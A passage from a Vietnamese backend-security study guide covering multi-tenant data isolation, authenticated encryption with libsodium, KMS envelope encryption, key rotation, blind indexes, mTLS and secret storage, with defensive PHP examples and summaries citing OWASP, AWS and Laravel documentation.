⚠️ Controller thường được để ý; lỗ hổng hay nằm ở những chỗ không có HTTP request:

- *Cache key thiếu tenant*: `Cache::remember('report:monthly', ...)` thì tenant nào gọi trước, mọi
  tenant sau thấy báo cáo của tenant đó. Key phải là `tenant:5:report:monthly`. Tốt nhất bọc một
  helper tự thêm tiền tố thay vì trông vào từng lời gọi.
- *File storage*: file của mọi tenant chung một prefix (`exports/report.csv`) hoặc tên file đoán
  được. Tách theo `tenants/{id}/...`, kiểm tra quyền trước khi trả file, và chỉ đưa ra link tạm thời
  có chữ ký (*signed URL*) có hạn.
- *Queue job*: worker không có HTTP request, nên middleware đặt tenant không chạy. Job phải mang
  `tenant_id` theo (property của job, hoặc `Context` của Laravel: dữ liệu đưa vào `Context` được
  đóng gói kèm payload job khi dispatch và nạp lại khi worker chạy job) rồi thiết lập lại tenant
  trước `handle()`. ⚠️ Worker là process sống lâu: tenant của job trước phải được xoá sau khi job
  xong, nếu không job kế tiếp của tenant khác chạy với tenant cũ. Cùng loại bẫy với state trong
  singleton khi chạy Octane
  ([05-php-laravel.md#35-process-sống-lâu-queue-worker-octane-daemon](05-php-laravel.md#35-process-sống-lâu-queue-worker-octane-daemon)).
- *Export và báo cáo*: thường viết bằng `DB::table` hoặc raw SQL cho nhanh, đúng loại query không
  có global scope.
- *Search index* (Elasticsearch, Meilisearch, Scout): index là một kho dữ liệu khác, không biết gì về
  global scope. Mỗi document phải có `tenant_id` và mọi truy vấn search phải lọc theo nó.
- Còn nữa: log và công cụ theo dõi lỗi chứa dữ liệu của tenant, webhook gửi nhầm endpoint, email
  gom nhóm, ID tuần tự để đoán, validation `exists` như bảng trên.

Kiểm chứng bằng test tự động, không bằng niềm tin. Mẫu test cho mỗi endpoint quan trọng:

```php
<?php
declare(strict_types=1);

namespace Tests\Feature;

use App\Models\Invoice;
use App\Models\Tenant;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

final class TenantIsolationTest extends TestCase
{
    use RefreshDatabase;

    public function test_user_tenant_a_khong_doc_duoc_hoa_don_tenant_b(): void
    {
        $tenantA  = Tenant::factory()->create();
        $tenantB  = Tenant::factory()->create();
        $invoiceB = Invoice::factory()->for($tenantB)->create();
        $userA    = User::factory()->for($tenantA)->create();

        // Global scope làm route model binding không tìm thấy bản ghi, nên 404
        // (404 tốt hơn 403: không xác nhận là bản ghi tồn tại)
        $this->actingAs($userA)
            ->getJson("/api/invoices/{$invoiceB->id}")
            ->assertNotFound();
    }
}
```

Nâng cấp: viết một test duyệt qua danh sách route, gọi mọi route có tham số bằng ID của tenant khác
và yêu cầu 404, để route mới thêm cũng tự được kiểm.

#### Noisy neighbor

*Noisy neighbor* (hàng xóm ồn ào): một tenant dùng quá nhiều tài nguyên chung (CPU DB, connection,
queue, băng thông) làm chậm các tenant khác. Nó cũng là vấn đề bảo mật: một tenant (hoặc kẻ chiếm
được tài khoản của tenant đó) có thể gây DoS cho mọi tenant còn lại. AWS nêu nó là một lý do khác để
cô lập, bên cạnh lý do bảo mật.

Cách chống, từ rẻ tới đắt:

- *Quota và rate limit theo tenant*, không chỉ theo user hay IP. Ví dụ trong Laravel:
  `Limit::perMinute(1000)->by('tenant:'.$tenantId)` trong `RateLimiter::for(...)`. Chi tiết rate
  limit ở module 2.9.
- Giới hạn kích thước công việc: số dòng export tối đa, phân trang bắt buộc, timeout cho query.
- Tách queue: tenant lớn có queue riêng hoặc giới hạn số job chạy song song, để một lần import một
  triệu dòng không chặn email của tenant khác.
- Tách hẳn tenant lớn sang silo (tier-based), như ví dụ 500 tenant ở trên.
- Đo được mới chống được: metric và log phải gắn `tenant_id` để biết tenant nào đang ăn tài nguyên.

**Tóm tắt nhanh**
- Silo, pool, bridge, tier-based; càng chung càng rẻ và càng dễ lộ chéo. Hệ thật thường là pool cho
  số đông, silo cho vài tenant lớn hoặc bị ràng buộc compliance, cùng một phiên bản code.
- `tenant_id` lấy từ danh tính đã xác thực, không lấy từ request; bộ lọc đặt ở một chỗ chung và
  fail closed khi thiếu tenant.
- Global scope không che `DB::table`, raw SQL, join, rule `exists`, command; insert cần tự điền
  `tenant_id`.
- Postgres RLS là lớp thứ hai ở DB (nhớ `FORCE`, role không `BYPASSRLS`, `set_config(..., true)`);
  MySQL không có RLS nên dựa vào tầng app và test.
- Chỗ hay lộ: cache key, file storage, queue job, export, search index. Viết test "tenant A không
  đọc được tenant B".
- Noisy neighbor là DoS giữa các tenant; chống bằng quota theo tenant và tách tenant lớn.

**Nguồn**: [PostgreSQL 18: Row Security Policies](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) ·
[Laravel 13: Global Scopes](https://laravel.com/docs/eloquent#global-scopes) ·
[Laravel 13: Context](https://laravel.com/docs/context) ·
[AWS: SaaS Tenant Isolation Strategies](https://docs.aws.amazon.com/whitepapers/latest/saas-tenant-isolation-strategies/saas-tenant-isolation-strategies.html) ·
[MySQL 8.4: CREATE VIEW](https://dev.mysql.com/doc/refman/8.4/en/create-view.html)


---

### 3.3 Crypto ứng dụng và quản lý key

Module này trả lời: khi phải tự mã hoá một field nhạy cảm (số CCCD, số tài khoản, token của bên thứ
ba) thì chọn thuật toán gì, giữ key ở đâu, đổi key thế nào mà không phải dừng hệ thống, và làm sao
vẫn tìm kiếm được trên dữ liệu đã mã hoá. Phần hash, HMAC, mã hoá cơ bản ở module 1.4.

#### Đối xứng và bất đối xứng

- *Mã hoá đối xứng* (symmetric): cùng một key để mã hoá và giải mã. Ví dụ AES, ChaCha20. Rất nhanh,
  ciphertext chỉ dài hơn plaintext vài chục byte, nên dùng cho dữ liệu thật. Khó ở chỗ hai bên phải
  có chung key mà không ai khác biết.
- *Mã hoá bất đối xứng* (asymmetric, public-key): một cặp key. Public key công khai, private key chỉ
  chủ sở hữu giữ. Ví dụ RSA, ECC (Curve25519, P-256). Chậm hơn nhiều và chỉ xử lý được dữ liệu nhỏ,
  nên dùng để *trao đổi key* hoặc *ký* (chữ ký số), không dùng mã hoá dữ liệu lớn.
- Khuyến nghị của OWASP (Cryptographic Storage Cheat Sheet): đối xứng dùng AES key ít nhất 128 bit,
  tốt nhất 256 bit, với mode có xác thực; bất đối xứng ưu tiên ECC với đường cong an toàn như
  Curve25519, nếu buộc dùng RSA thì key ít nhất 2048 bit (và dùng padding OAEP khi mã hoá).
- ⚠️ RSA và ECC (kể cả Curve25519) không an toàn trước máy tính lượng tử đủ mạnh trong tương lai.
  Với dữ liệu cần giữ bí mật rất lâu, OWASP nhắc tới ML-KEM (FIPS 203), thường ghép *hybrid* với
  thuật toán cổ điển trong giai đoạn chuyển đổi. Ở mức phỏng vấn backend, biết là có vấn đề này là
  đủ.

TLS dùng cả hai: bất đối xứng để hai bên thống nhất một key chung (trao đổi key kiểu Diffie-Hellman
trên đường cong elliptic) và để server chứng minh danh tính bằng chữ ký trên certificate; sau đó toàn
bộ dữ liệu được mã hoá đối xứng bằng key vừa thống nhất. Envelope encryption ở dưới cũng là tinh
thần "ghép điểm mạnh của nhiều loại key".

#### AEAD

*Plaintext* là dữ liệu gốc, *ciphertext* là dữ liệu sau mã hoá. Mã hoá chỉ bảo vệ *bí mật*
(confidentiality); nó không tự bảo đảm *toàn vẹn* (integrity). Với mode không xác thực, kẻ tấn công
sửa vài bit ciphertext thì plaintext giải ra bị đổi theo mà không ai phát hiện.

*AEAD* (Authenticated Encryption with Associated Data) làm cả hai việc trong một thao tác:

```
encrypt(key, nonce, plaintext, AAD) -> ciphertext + tag
decrypt(key, nonce, ciphertext + tag, AAD) -> plaintext   hoặc   LỖI nếu bất cứ thứ gì bị sửa
```

- *Tag*: mã xác thực (thường 16 byte) tính trên ciphertext và AAD. Sai một bit là giải mã thất bại.
- *AAD* (Associated Data, dữ liệu kèm theo): dữ liệu **không** được mã hoá nhưng được xác thực. Dùng
  để "buộc" ciphertext vào ngữ cảnh của nó, ví dụ id của bản ghi. Kẻ có quyền ghi DB chép ciphertext
  CCCD của user 7 sang dòng của user 42 thì giải mã thất bại vì AAD khác. CipherSweet khuyến nghị
  dùng primary key làm AAD cho mọi field mã hoá.
- *Nonce* (number used once): giá trị truyền vào mỗi lần mã hoá để cùng plaintext và cùng key vẫn ra
  ciphertext khác nhau. Nonce không cần bí mật, thường lưu ngay đầu ciphertext.
- Ví dụ AEAD: AES-GCM, AES-CCM, ChaCha20-Poly1305, XChaCha20-Poly1305. OWASP xếp GCM và CCM là lựa
  chọn đầu tiên khi dùng AES.

⚠️ Với AES-GCM, nonce **không bao giờ được lặp** với cùng một key:

- GCM mã hoá bằng cách XOR plaintext với một dòng khoá (*keystream*) sinh từ key và nonce. Cùng key,
  cùng nonce thì cùng keystream, nên XOR hai ciphertext ra đúng XOR của hai plaintext: lộ quan hệ
  giữa chúng, và biết một plaintext là suy ra plaintext kia.
- Tệ hơn, từ hai ciphertext trùng nonce kẻ tấn công có thể khôi phục khoá xác thực nội bộ của GCM
  rồi **giả** tag cho ciphertext tuỳ ý: mất cả toàn vẹn chứ không chỉ bí mật.
- Nonce của AES-GCM dài 96 bit. Sinh ngẫu nhiên thì xác suất trùng tăng nhanh theo số lần mã hoá
  (nghịch lý ngày sinh), nên NIST SP 800-38D giới hạn 2^32 lần mã hoá cho mỗi key khi nonce sinh
  ngẫu nhiên. Hệ thống mã hoá hàng tỉ bản ghi bằng một key phải tính tới giới hạn này.
- XChaCha20-Poly1305 có nonce 192 bit, đủ dài để sinh ngẫu nhiên mà không phải lo trùng trong thực
  tế. Đây là lý do CipherSweet và nhiều thư viện hiện đại chọn nonce mở rộng.

⚠️ Các mode cũ:

- *ECB* mã hoá từng khối 16 byte độc lập: khối plaintext giống nhau cho ra khối ciphertext giống
  nhau, nên cấu trúc dữ liệu lộ ra (ví dụ kinh điển: ảnh mã hoá ECB vẫn nhìn ra hình). OWASP: không
  dùng ngoài trường hợp rất đặc biệt.
- *CBC* (và CTR) không có xác thực. CBC không kèm MAC dễ bị *padding oracle*: CBC đệm plaintext cho
  đủ khối (*padding*), nếu server trả lỗi "padding sai" khác với lỗi khác (qua message, status hay
  thời gian phản hồi), kẻ tấn công sửa ciphertext rồi gửi đi gửi lại, dựa vào câu trả lời đó để giải
  mã từng byte mà không cần key. Nếu buộc dùng CBC/CTR, phải *Encrypt-then-MAC*: mã hoá trước, rồi
  tính HMAC trên ciphertext, và kiểm tra MAC (so sánh constant-time) **trước** khi giải mã.

Đối chiếu với thứ quen thuộc: `Crypt`/`encrypt()` của Laravel 13 mặc định dùng AES-256-CBC kèm MAC
HMAC-SHA256 (đúng kiểu Encrypt-then-MAC, `config/app.php` có `'cipher' => 'AES-256-CBC'`), và hỗ trợ
thêm AES-128/256-GCM. Tự viết mã hoá trong PHP thì dùng libsodium (có sẵn từ PHP 7.2):

```php
<?php
declare(strict_types=1);

// Chạy: php aead.php   (cần extension sodium, có sẵn trong đa số bản PHP)
// XChaCha20-Poly1305: nonce 24 byte sinh ngẫu nhiên, không lo trùng

function seal(string $plaintext, string $key, string $aad): string
{
    $nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES); // 24 byte
    return $nonce . sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($plaintext, $aad, $nonce, $key);
}

function open(string $blob, string $key, string $aad): string
{
    $n     = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;
    $plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(substr($blob, $n), $aad, substr($blob, 0, $n), $key);
    if ($plain === false) {                       // sai key, sai AAD, hoặc ciphertext bị sửa
        throw new RuntimeException('Giải mã thất bại');
    }
    return $plain;
}

$key  = sodium_crypto_aead_xchacha20poly1305_ietf_keygen();   // 32 byte ngẫu nhiên
$blob = seal('001234567890', $key, 'users:42');

echo open($blob, $key, 'users:42'), PHP_EOL;                  // 001234567890

try {
    open($blob, $key, 'users:7');                             // ciphertext bị chép sang dòng khác
} catch (RuntimeException $e) {
    echo $e->getMessage(), PHP_EOL;                           // Giải mã thất bại
}

$tampered     = $blob;
$tampered[30] = chr(ord($tampered[30]) ^ 1);                  // lật một bit
try {
    open($tampered, $key, 'users:42');
} catch (RuntimeException $e) {
    echo $e->getMessage(), PHP_EOL;                           // Giải mã thất bại
}
```

Thư viện cấp cao như Google Tink cho thấy một API "khó dùng sai" trông thế nào: người dùng chọn một
*primitive* (AEAD, Deterministic AEAD, MAC, chữ ký, streaming AEAD...) và một mẫu key, còn nonce,
mode, định dạng ciphertext do thư viện lo, nên không có chỗ để truyền nhầm nonce cố định. Key được
quản lý theo *keyset* (một tập key, trong đó một key là *primary* dùng để mã hoá, các key khác vẫn
giải mã được) và tích hợp sẵn với KMS, nên rotation và envelope encryption là tính năng có sẵn chứ
không phải code tự viết. Tink có bản chính thức cho Java, C++, Objective-C, Go, Python; PHP không có bản chính thức, tương
đương ở PHP là libsodium hoặc CipherSweet.

#### KMS và envelope encryption

Mã hoá xong thì câu hỏi chuyển thành "giữ key ở đâu". Để key trong `.env` cạnh app thì ai đọc được
file đó (lộ server, lộ backup, SSRF đọc file) là có cả key lẫn dữ liệu.

- *HSM* (Hardware Security Module): thiết bị phần cứng chuyên dụng sinh và giữ key, thực hiện thao
  tác mã hoá bên trong; key không bao giờ ra khỏi thiết bị ở dạng rõ.
- *KMS* (Key Management Service, ví dụ AWS KMS, GCP Cloud KMS, Azure Key Vault): dịch vụ bọc HSM lại
  thành API. Theo tài liệu AWS, KMS key không bao giờ rời HSM (được chứng nhận FIPS 140-3 Level 3) ở
  dạng chưa mã hoá; muốn dùng key là phải gọi API KMS. Mỗi lời gọi đi qua phân quyền IAM và được ghi
  log audit.

KMS không phù hợp để mã hoá trực tiếp mọi dữ liệu: mỗi thao tác là một lời gọi mạng, có giới hạn kích
thước payload và giới hạn tần suất. Lời giải là *envelope encryption* (mã hoá phong bì), dùng hai tầng
key:

- *DEK* (Data Encryption Key): key đối xứng sinh ngẫu nhiên, dùng mã hoá dữ liệu ngay trong app.
- *KEK* (Key Encryption Key): key dùng để mã hoá DEK. Nằm trong KMS/HSM, không bao giờ ra ngoài. Key
  ở tầng trên cùng còn gọi là *root key*.

```
        KMS (HSM)                              Database
   ┌────────────────┐           ┌──────────────────────────────────────┐
   │  KEK (root key) │           │ id | enc_dek        | enc_cccd       │
   │  không ra ngoài │           │ 42 | KEK(DEK_42)    | DEK_42(CCCD)   │
   └───────┬────────┘           │ 43 | KEK(DEK_43)    | DEK_43(CCCD)   │
           │ wrap / unwrap DEK   └──────────────────────────────────────┘
           ▼                                   ▲
        App: dùng DEK mã hoá / giải mã dữ liệu ┘
```

Quy trình mã hoá:

1. Xin một DEK mới. Với AWS, lời gọi `GenerateDataKey` trả về **cùng lúc** DEK dạng rõ và DEK đã được
   KEK mã hoá, nên bước "sinh DEK" và "gọi KMS mã hoá DEK" gộp làm một.
2. Dùng DEK dạng rõ mã hoá dữ liệu bằng AEAD ngay trong app.
3. Lưu DEK đã mã hoá cạnh dữ liệu đã mã hoá. DEK đã mã hoá lưu ở đâu cũng được, vì không có KEK thì nó
  vô dụng.
4. Xoá DEK dạng rõ khỏi memory (trong PHP: `sodium_memzero()`).

Giải mã thì ngược lại: gửi DEK đã mã hoá cho KMS (`Decrypt`), nhận DEK dạng rõ, rồi giải dữ liệu.

Lợi ích (theo AWS và OWASP):

- Dữ liệu lớn không phải đi qua KMS; KMS chỉ xử lý các DEK 32 byte.
- Cùng dữ liệu cần mở bằng nhiều key thì chỉ mã hoá lại DEK, không mã hoá lại dữ liệu.
- Đổi KEK không phải mã hoá lại dữ liệu, chỉ bọc lại (*re-wrap*) các DEK.
- Phân quyền và audit tập trung ở KMS: biết service nào, lúc nào, giải mã DEK nào. Lộ nguyên DB
  (SQL injection, backup lọt) mà không lộ quyền gọi KMS thì dữ liệu vẫn an toàn.
- Với KMS của AWS, có thể truyền *encryption context* (một tập cặp key-value không bí mật, đóng vai trò AAD) khi mã hoá
  DEK; phải truyền đúng context đó mới giải được, và context hiện trong log audit.

Quyết định thiết kế hay bị hỏi: một DEK cho mỗi bản ghi hay cho mỗi tenant?

| | DEK mỗi bản ghi | DEK mỗi tenant |
|---|---|---|
| Lộ một DEK | Lộ một bản ghi | Lộ dữ liệu cả tenant |
| Số lần gọi KMS | Mỗi lần đọc một bản ghi (thường phải cache DEK có thời hạn) | Một lần, cache lại |
| Xoá dữ liệu | Xoá từng bản ghi | *Crypto-shredding*: huỷ DEK của tenant là toàn bộ dữ liệu (cả trong backup) thành không đọc được |

MySQL cũng dùng đúng mô hình này cho *InnoDB data-at-rest encryption*: một *master key* nằm trong
keyring bọc các *tablespace key*; rotate master key chỉ mã hoá lại tablespace key, không mã hoá lại
dữ liệu.

Mô phỏng chạy được, KEK là biến local thay cho KMS (dùng lại `seal()`, `open()` ở trên):

```php
// Tiếp file aead.php
$kek = ['v1' => sodium_crypto_aead_xchacha20poly1305_ietf_keygen()];   // thực tế: nằm trong KMS

// Mã hoá bản ghi 42
$dek = sodium_crypto_aead_xchacha20poly1305_ietf_keygen();
$row = [
    'kek_version' => 'v1',
    'enc_dek'     => seal($dek, $kek['v1'], 'users:42'),   // thực tế: KMS GenerateDataKey/Encrypt
    'enc_cccd'    => seal('001234567890', $dek, 'users:42'),
];
sodium_memzero($dek);                                      // bỏ DEK dạng rõ khỏi memory

// Rotate KEK: chỉ bọc lại DEK, cột enc_cccd không đổi
$kek['v2']          = sodium_crypto_aead_xchacha20poly1305_ietf_keygen();
$dekPlain           = open($row['enc_dek'], $kek[$row['kek_version']], 'users:42');
$row['enc_dek']     = seal($dekPlain, $kek['v2'], 'users:42');
$row['kek_version'] = 'v2';
sodium_memzero($dekPlain);

// Giải mã sau khi rotate
$dek = open($row['enc_dek'], $kek[$row['kek_version']], 'users:42');
echo open($row['enc_cccd'], $dek, 'users:42'), PHP_EOL;    // 001234567890
```

#### Key rotation

*Key rotation* là thay key đang dùng bằng key mới. OWASP liệt kê các lý do phải rotate: key bị lộ
hoặc nghi lộ (kể cả khi người từng có quyền với key nghỉ việc), hết *cryptoperiod* (thời hạn dùng của
key, tuỳ độ nhạy dữ liệu và threat model, xem NIST SP 800-57), key đã mã hoá quá nhiều dữ liệu, hoặc
thuật toán có tấn công mới.

Cơ chế chung:

1. Key có version (`v1`, `v2`...). Ciphertext ghi kèm version hoặc key ID đã dùng (một cột riêng, hoặc
   tiền tố trong chính ciphertext như Tink làm).
2. Khi có key mới: mọi lần mã hoá **mới** dùng key mới.
3. Dữ liệu cũ vẫn giải được bằng key cũ, nhờ version ghi kèm.
4. Một job nền mã hoá lại dần dữ liệu cũ bằng key mới. OWASP khuyên nên làm bước này (mã hoá lại)
   thay vì giữ nhiều key mãi mãi, vì code và quy trình đơn giản hơn.
5. Key cũ chỉ huỷ khi không còn ciphertext nào dùng nó, **kể cả trong backup** còn phải khôi phục
   được. OWASP: dữ liệu mã hoá bằng key đã mất thì mất vĩnh viễn.

Ví dụ quen thuộc: Laravel cho khai báo `APP_PREVIOUS_KEYS`; `encrypt` luôn dùng `APP_KEY` hiện tại,
`decrypt` thử key hiện tại rồi lần lượt các key cũ
([05-php-laravel.md#37-bảo-mật-đặc-thù-php](05-php-laravel.md#37-bảo-mật-đặc-thù-php)). Laravel không
tự mã hoá lại dữ liệu cũ; việc đó là của bạn.

Với KMS, rotation KEK có hai kiểu:

- *Rotation tự động của KMS*: KMS sinh vật liệu key mới cho **cùng** key ID và giữ vật liệu cũ, nên
  DEK đã bọc bằng bản cũ vẫn giải được. Nó không tự bọc lại DEK cũ; nếu lo KEK cũ đã lộ thì phải tự
  re-wrap.
- *Rotation thủ công*: tạo KEK mới (key ID mới), re-wrap từng DEK. Dữ liệu vẫn không phải động tới.

⚠️ OWASP nhấn mạnh: code và quy trình rotate phải có **trước** khi cần. Lúc key bị lộ là lúc tệ nhất
để lần đầu viết script rotate.

#### Encryption at rest không đủ

Mã hoá có thể đặt ở nhiều tầng (OWASP liệt kê): phần cứng (ổ SSD tự mã hoá), filesystem (LUKS,
BitLocker), database (TDE, InnoDB tablespace encryption), ứng dụng. Câu hỏi đúng không phải "có mã hoá
không" mà là "mã hoá ở tầng này chống được kẻ tấn công nào":

| Tầng mã hoá | Chống được | Không chống được |
|---|---|---|
| Disk / filesystem | Mất ổ đĩa, trả máy về nhà cung cấp | Mọi thứ khi server đang chạy |
| Database (TDE, tablespace) | Lộ file data, file backup vật lý | SQL injection, app bị chiếm, DBA tò mò, `mysqldump` (dump ra dạng rõ) |
| Ứng dụng (field-level, key ở KMS) | Cả những thứ trên, kể cả kẻ đọc được toàn bộ DB | Kẻ chiếm được app **và** quyền gọi KMS của app |

Lý do cốt lõi: với encryption at rest, DB (hoặc OS) tự giải mã cho bất kỳ ai được phép query. Kẻ tấn
công vào qua SQL injection hay qua app bị chiếm thì chính là "người được phép query", nên nhận dữ liệu
dạng rõ. Trả lời "DB đã bật encryption at rest" cho câu hỏi "dữ liệu nhạy cảm có được bảo vệ không"
chỉ đúng với kịch bản mất ổ đĩa.

Vì vậy field cực nhạy cảm (CCCD, số tài khoản, token OAuth của bên thứ ba) mã hoá ở tầng ứng dụng,
key để tách khỏi dữ liệu (OWASP: key và dữ liệu nằm ở hai nơi khác nhau, để lỗ hổng chỉ đọc được một
nơi thì chưa đủ). Kèm theo vẫn cần phân quyền chặt: OWASP nhắc app phải an toàn ngay cả khi lớp mã hoá
thất bại.

#### Tìm kiếm trên field đã mã hoá

Vấn đề: AEAD với nonce ngẫu nhiên cho ra ciphertext khác nhau mỗi lần, kể cả cùng plaintext. Tính
chất đó (*indistinguishability*: không phân biệt được hai ciphertext có cùng plaintext hay không) là
điều ta muốn cho bí mật, nhưng nó làm `WHERE cccd = ?` không chạy được.

*Blind index*: lưu thêm một cột là keyed hash (HMAC) của giá trị đã chuẩn hoá, với một key **riêng**
(không dùng lại key mã hoá). Tìm kiếm bằng cách tính HMAC của giá trị cần tìm rồi so cột đó:

```php
// Tiếp file aead.php
function blindIndex(string $cccd, string $indexKey): string
{
    $normalized = (string) preg_replace('/\D+/', '', $cccd);        // chuẩn hoá: chỉ giữ chữ số
    return substr(hash_hmac('sha256', $normalized, $indexKey), 0, 16); // cắt ngắn, xem bên dưới
}

$indexKey = random_bytes(32);   // key riêng cho index, thực tế cũng lấy từ KMS
var_dump(blindIndex('001 234 567 890', $indexKey) === blindIndex('001234567890', $indexKey)); // bool(true)

// Lưu:  INSERT INTO users (enc_cccd, cccd_bidx) VALUES (?, ?)   với cccd_bidx có index
// Tìm:  SELECT ... WHERE cccd_bidx = ?   rồi giải mã các dòng khớp và so lại plaintext
```

Thiết kế của CipherSweet (thư viện PHP của Paragon IE) cho thấy các chi tiết cần nghĩ tới:

- Mỗi cột mã hoá và mỗi blind index có key riêng, đều dẫn xuất từ một master key bằng HKDF.
- Blind index được *cắt ngắn* (truncate) còn vài bit, biến nó thành một *Bloom filter*: có thể khớp
  nhầm (false positive), nhưng không bao giờ bỏ sót. Vì vậy sau khi lọc bằng index phải giải mã và so
  lại. Đổi lại, hai dòng trùng index không còn chứng minh chắc chắn là cùng plaintext.
- Có *slow blind index* dùng hàm dẫn xuất key chậm (PBKDF2, Argon2) thay cho HMAC, cho dữ liệu có
  không gian giá trị nhỏ.
- Có thể tạo index trên *biến đổi* của plaintext (ví dụ 4 số cuối) để hỗ trợ kiểu tìm khác, nhưng
  không hỗ trợ `LIKE`, regex hay so sánh lớn nhỏ.
- Mô hình mối đe doạ của CipherSweet giả định kẻ tấn công chỉ thấy ciphertext và blind index; key
  không bao giờ được gửi tới DB server.

⚠️ Blind index vẫn làm lộ thông tin:

- Lộ *tần suất*: nhiều dòng cùng giá trị index gần như chắc là cùng plaintext. Càng nhiều index trên
  một field và index càng dài thì kẻ tấn công càng chắc chắn. CipherSweet khuyên dùng ít index và
  ngắn nhất có thể.
- Giá trị có ít khả năng (giới tính, tỉnh thành, năm sinh) thì blind index vô nghĩa: đếm tần suất hoặc
  thử hết là đoán ra.
- Không gian nhỏ + lộ key index = lộ dữ liệu: CCCD 12 chữ số chỉ có 10^12 giá trị, kẻ có cả DB lẫn
  key index có thể thử hết. Key index phải được bảo vệ ngang key mã hoá.

Phương án khác: *deterministic encryption* (ví dụ AES-SIV, primitive "Deterministic AEAD" của Tink):
cùng plaintext luôn ra cùng ciphertext nên `WHERE` được trực tiếp. Nó lộ đúng thông tin "hai giá trị
bằng nhau" như blind index không cắt ngắn; CipherSweet cố ý không dùng cách này.

#### mTLS

TLS thông thường chỉ server xuất trình certificate; client xác thực bằng thứ khác (password, token).
*mTLS* (mutual TLS) thì cả hai bên cùng xuất trình certificate và cùng kiểm tra certificate của bên
kia trong lúc bắt tay TLS:

1. Mỗi service có một cặp key và một certificate do *CA nội bộ* (Certificate Authority của tổ chức)
   ký, trong đó ghi danh tính service.
2. Khi kết nối, server kiểm tra certificate của client có chuỗi tới CA nội bộ, còn hạn, đúng danh
   tính được phép gọi; client kiểm tra ngược lại.
3. Kết nối được mã hoá như TLS thường, và mỗi bên biết chắc bên kia là ai.

Dùng khi nào: giữa các service mà không tin mạng nội bộ (*zero trust*: không coi "nằm trong VPC" là
bằng chứng tin cậy), kết nối tới đối tác (open banking), hoặc gắn access token với certificate client
(mTLS-bound token, module 3.1).

Cái giá là quản lý certificate: cấp, gia hạn, thu hồi cho mọi service. Các *service mesh* (Istio,
Linkerd) giải quyết bằng cách tự cấp certificate ngắn hạn và tự bật mTLS giữa các pod, app không phải
sửa code. ⚠️ Nếu TLS kết thúc ở load balancer thì đoạn từ load balancer tới app không còn là mTLS; app
chỉ nhận được thông tin certificate qua header do load balancer chèn, và phải chắc client không tự gửi
được header đó.

**Tóm tắt nhanh**
- Mặc định dùng AEAD (AES-GCM, XChaCha20-Poly1305) qua thư viện cấp cao; không tự ghép mode, không ECB,
  không CBC thiếu MAC.
- AES-GCM lặp nonce với cùng key là mất cả bí mật lẫn toàn vẹn; nonce ngẫu nhiên 96 bit có giới hạn số
  lần mã hoá mỗi key, XChaCha20 với nonce 192 bit thoải mái hơn. Dùng AAD để buộc ciphertext vào bản
  ghi.
- Envelope encryption: DEK mã hoá dữ liệu trong app, KEK ở KMS bọc DEK; rotate KEK chỉ re-wrap DEK.
  DEK theo tenant cho phép crypto-shredding.
- Rotation: key có version, ciphertext ghi version, mã hoá mới bằng key mới, mã hoá lại dần dữ liệu
  cũ, giữ key cũ tới khi hết backup cần nó.
- Encryption at rest chỉ chống mất đĩa hoặc lộ file; không chống SQL injection hay app bị chiếm. Field
  cực nhạy cảm mã hoá ở tầng app, key tách khỏi dữ liệu.
- Blind index (HMAC với key riêng, cắt ngắn) cho tìm kiếm chính xác, nhưng lộ tần suất và vô nghĩa với
  giá trị ít khả năng.

**Nguồn**: [AWS KMS: cryptography essentials, envelope encryption](https://docs.aws.amazon.com/kms/latest/developerguide/kms-cryptography.html#enveloping) ·
[OWASP Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html) ·
[OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) ·
[Google Tink](https://developers.google.com/tink) ·
[CipherSweet](https://ciphersweet.paragonie.com/) và [CipherSweet: Security Properties and Threat Model](https://ciphersweet.paragonie.com/security) ·
[Laravel 13: Encryption](https://laravel.com/docs/encryption) ·
*Serious Cryptography*, 2nd ed. (phần block cipher mode và authenticated encryption)


---

### 3.4 Secret và supply chain

Module này trả lời: secret nên nằm ở đâu và sống bao lâu, lỡ lộ thì xử lý theo thứ tự nào, và làm
sao tin được những dòng code mình không tự viết (package, base image, công cụ build) đang chạy trong
sản phẩm.

#### Lưu secret

*Secret* là mọi thứ cấp quyền truy cập: password DB, API key, `APP_KEY`, private key, token OAuth,
SSH key, certificate. OWASP (Secrets Management Cheat Sheet) nêu vấn đề thường gặp: secret bị
hard-code trong code, rải rác trong file cấu hình, và **nhiều service dùng chung một secret**, nên
khi lộ không biết lộ từ đâu.

Các mức lưu, từ tệ tới tốt:

| Mức | Ví dụ | Vấn đề |
|---|---|---|
| Hard-code, commit vào git | `$key = 'AKIA...'`, commit `.env` | Ai có repo (và mọi bản clone, fork, backup) đều có secret, mãi mãi |
| File `.env` trên server, không commit | Laravel mặc định | Lộ khi server bị đọc file; không audit, không rotation |
| Biến môi trường do orchestrator bơm vào | Kubernetes Secret thành env var | Mức tối thiểu chấp nhận được, vẫn có các đường lộ bên dưới |
| Secret manager | Vault, AWS Secrets Manager, GCP Secret Manager | Có phân quyền, audit, rotation; tốn công tích hợp |
| Không có secret dài hạn | IAM role, workload identity, dynamic secret | Tốt nhất: không có gì để lộ lâu dài |

⚠️ Env var vẫn lộ qua nhiều đường. OWASP khuyên tránh dùng env var cho secret khi có cách khác:

- `phpinfo()` in toàn bộ biến môi trường; trang lỗi chi tiết khi bật debug (`APP_DEBUG=true` ở
  production).
- `/proc/<pid>/environ` đọc được bởi cùng user hoặc root; một lỗ đọc file tuỳ ý (path traversal) có
  thể đọc `/proc/self/environ`.
- Process con thừa hưởng toàn bộ env của process cha.
- Crash dump, log in ra env khi debug, công cụ theo dõi lỗi gửi kèm context.
- Không bao giờ đặt secret bằng `ENV` hay `ARG` trong Dockerfile: nó nằm luôn trong image (OWASP).

Laravel có `php artisan env:encrypt`: mã hoá `.env` thành `.env.encrypted` để commit được cùng code,
key giải mã in ra một lần và phải giữ trong password manager; lúc deploy chạy `env:decrypt` với key
lấy từ biến `LARAVEL_ENV_ENCRYPTION_KEY`. Nó giải quyết việc phân phối cấu hình, nhưng key giải mã
lại là một secret cần giữ, và không có audit hay rotation tự động.

